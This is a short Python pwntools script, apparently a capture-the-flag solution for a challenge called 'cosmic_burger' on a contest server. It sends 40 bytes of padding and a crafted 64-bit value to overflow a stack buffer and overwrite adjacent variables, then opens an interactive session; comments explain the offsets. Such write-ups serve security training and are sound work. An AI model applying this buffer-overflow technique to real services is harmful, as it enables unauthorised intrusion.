#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./cosmic_burger', checksec=False)

p = remote("offsec.m0lecon.it", 13565)

food = 0xbeef0000f00d

#python3 -c "from pwn import *; print(cyclic(200))
#32B (buf) + 8B (saved RBP)

#offset for sauce is 40, cheese is 44 (int size is 4B)
#beef is just 2B so we need 2B of padding

p.recvuntil(b"What's your order?")
payload = flat(
    b'A' * 40,
    p64(food)
)
p.send(payload)

p.interactive()
